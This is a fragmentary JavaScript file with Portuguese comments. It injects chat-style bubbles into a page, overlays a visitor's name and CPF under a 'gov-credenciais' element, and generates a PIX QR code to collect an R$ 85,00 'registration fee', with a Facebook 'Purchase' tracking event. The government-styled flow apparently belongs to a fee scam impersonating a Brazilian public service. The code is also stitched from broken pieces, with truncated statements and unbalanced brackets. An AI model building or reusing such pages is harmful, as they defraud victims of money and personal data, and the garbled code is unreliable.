    if(!feito.texto){

      for(var j=0;j<btns.length;j++){

          feito.botao=true;

  // Sobe na árvore até encontrar um elemento cujo PAI seja um container vertical
  // (block ou flex-column) — garante que inserir depois dele coloca o novo elemento ABAIXO
  function encontrarMensagemRow(el){
    var cur = el;
    var candidato = null;
    for(var i=0;i<14;i++){
      if(!cur.parentElement||cur.parentElement===document.body) break;
      cur = cur.parentElement;
      // Marca o elemento quando encontramos um img (avatar da Nanda)
      if(!candidato && cur.querySelector('img')!==null) candidato = cur;
      // Valida: o pai do candidato tem layout vertical?
      if(candidato && candidato.parentElement){
        var st = window.getComputedStyle(candidato.parentElement);
        var vertical = st.display==='block'||
          (st.display==='flex'&&(st.flexDirection==='column'||st.flexDirection==='column-reverse'))||
          st.display==='list-item';
        if(vertical) return candidato;
        // Pai não é vertical, sobe e tenta de novo
        candidato = cur;
      }
    }
    return candidato || el.parentElement;
  }

      avatar.appendChild(img);

      bWrap.appendChild(tail);
      bWrap.appendChild(bubble);
      wrap.appendChild(avatar);
      wrap.appendChild(bWrap);
      return wrap;

      if(!ancorEl||!ancorEl.parentElement) return;

      if(!document.getElementById('dot-style')){
        var ds = document.createElement('style');

        var conteudo = parags.map(function(html){ return '<p style="margin:0 0 8px;">'+html+'</p>'; }).join('');

    function mostrarPagamentoPix(ancorEl){
      if(!ancorEl||!ancorEl.parentElement) return;

      var loadingEl = criarBalao(
        '<div style="display:flex;gap:7px;align-items:center;padding:4px 2px;">' +
          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite 0s;"></span>' +
          '<span style="width:9px;height:9px;border-radius:50%;background:#888;display:inline-block;animation:_dot 1s infinite .2s;"></span>' +

        '</div>'
      );
      ancorEl.parentElement.insertBefore(loadingEl, ancorEl.nextSibling);

      var cpfPag  = dadosGov&&dadosGov.cpf  ? dadosGov.cpf  : '';

      fetch('/api/pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ nome: nomePag, cpf: cpfPag })
      })
      .then(function(res){ return res.json(); })
      .then(function(data){
        if(loadingEl.parentElement) loadingEl.parentElement.removeChild(loadingEl);

        if(data && data.qr_code){
          var balao = criarBalao(
            '<p style="margin:0 0 8px;font-weight:700;">Pagamento gerado com sucesso!</p>' +
            '<p style="margin:0 0 8px;">Escaneie o QR Code ou copie o código PIX abaixo para pagar a taxa de inscrição de <b>R$&nbsp;85,00</b>:</p>'
          );
          var bubble = balao.children[1] && balao.children[1].children[1];
          if(bubble){
            var qrImg = document.createElement('img');
            var qrSrc = data.qr_code;
            if(qrSrc && !qrSrc.startsWith('http') && !qrSrc.startsWith('data:')) {
              qrSrc = 'data:image/png;base64,' + qrSrc;
            }
            qrImg.src = qrSrc;
            qrImg.style.cssText = 'width:190px;height:190px;display:block;margin:10px auto;border:1px solid #ddd;border-radius:6px;';

            var pixLabel = document.createElement('p');
            pixLabel.style.cssText = 'margin:8px 0 4px;font-size:12px;font-weight:700;';

            pixBox.style.cssText = 'background:#f0f0f0;border:1px solid #ccc;border-radius:6px;padding:8px 10px;font-size:10px;word-break:break-all;color:#333;margin-bottom:8px;line-height:1.4;';
            pixBox.textContent = data.qr_code_text;
            bubble.appendChild(pixBox);

            var copyBtn = document.createElement('button');
            copyBtn.id = 'btn-copiar-pix';
            copyBtn.textContent = 'Copiar código PIX';
            copyBtn.style.cssText = 'width:100%;background:#1351b4;color:#fff;font-size:14px;font-weight:700;border:none;border-radius:6px;padding:12px;cursor:pointer!important;font-family:Arial,sans-serif;margin-bottom:8px;';
            copyBtn.addEventListener('click', function(e){
              e.stopPropagation();
              var texto = data.qr_code_text;
              function fallbackCopy(t){
                var ta = document.createElement('textarea');
                ta.value = t;
                ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;';
                document.body.appendChild(ta);
                ta.focus(); ta.select();
                try {
                  document.execCommand('copy');
                  copyBtn.textContent = '✓ Copiado!'; copyBtn.style.background = '#168821';
                  setTimeout(function(){ copyBtn.textContent='Copiar código PIX'; copyBtn.style.background='#1351b4'; }, 2500);
                } catch(_){}
                document.body.removeChild(ta);
              }
              if(navigator.clipboard && navigator.clipboard.writeText){
                navigator.clipboard.writeText(texto).then(function(){
                  copyBtn.textContent = '✓ Copiado!'; copyBtn.style.background = '#168821';
                  setTimeout(function(){ copyBtn.textContent='Copiar código PIX'; copyBtn.style.background='#1351b4'; }, 2500);
                }).catch(function(){ fallbackCopy(texto); });
              } else {
                fallbackCopy(texto);
              }
            });
            bubble.appendChild(copyBtn);

            var expP = document.createElement('p');
            expP.style.cssText = 'margin:0;font-size:11px;color:#888;text-align:center;';
            expP.textContent = 'O QR Code expira em 30 minutos. Após o pagamento, sua inscrição será confirmada automaticamente.';
            bubble.appendChild(expP);
          }

          ancorEl.parentElement.insertBefore(balao, ancorEl.nextSibling);
          ultimoBalao = balao;
          btn.style.display = 'none';
          cover.style.display = 'none';
          if(typeof fbq === 'function') fbq('track', 'Purchase', {value: 85.00, currency: 'BRL'});
          setTimeout(function(){ balao.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
        } else {
          var errMsg = (data && data.message) ? data.message : 'Erro ao gerar o PIX.';
          var errBalao = criarBalao(
            '<p style="margin:0 0 6px;color:#c62828;font-weight:700;">Erro ao gerar pagamento</p>' +
            '<p style="margin:0;font-size:13px;">'+errMsg+'</p>'

          ultimoBalao = errBalao;
          estagio = 8;
          btn.disabled = false; btn.style.background = '#1351b4'; btn.textContent = 'Tentar novamente';
          setTimeout(function(){ errBalao.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
        }
      })
      .catch(function(){
        if(loadingEl.parentElement) loadingEl.parentElement.removeChild(loadingEl);
        var errBalao = criarBalao(

        estagio = 8;
        btn.disabled = false; btn.style.background = '#1351b4'; btn.textContent = 'Tentar novamente';
        setTimeout(function(){ errBalao.scrollIntoView({behavior:'smooth',block:'start'}); }, 80);
      });
    }

  });

    if(document.getElementById('gov-credenciais')) return;
    var div=document.createElement('div');
    div.id='gov-credenciais';
    div.style.cssText=[
      'position:fixed',
      'bottom:60px',
      'left:0',
      'padding:4px 12px',
      'z-index:99999',
      'pointer-events:none',
      'line-height:1.35'
    ].join(';');
    div.innerHTML=
      '<div style="font-size:13px;font-weight:700;color:#1a1a1a;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:240px;">'+dados.nome+'</div>'+
      '<div style="font-size:12px;color:#555;">'+fmtCPF(dados.cpf||'')+'</div>';
    document.body.appendChild(div);
  }

  document.addEventListener('DOMContentLoaded',function(){
    injetar();
    new MutationObserver(injetar).observe(document.body,{childList:true,subtree:false});
  });
})();
